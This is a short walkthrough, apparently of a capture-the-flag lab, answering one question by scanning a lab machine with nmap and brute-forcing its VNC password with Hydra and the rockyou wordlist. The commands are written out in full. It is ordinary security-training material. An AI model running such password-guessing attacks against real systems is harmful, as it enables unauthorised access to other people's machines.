### Question 1

> Use Hydra to find the VNC password of the target with IP address `$MACHINE_IP`. What is the password?

We run `nmap` in service discovery mode like so: `nmap -sS $IP` to check that VNC is running on the machine.

We then run `hydra` to find the password for `mark`: `hydra -P /usr/share/wordlists/rockyou.txt $IP vnc`
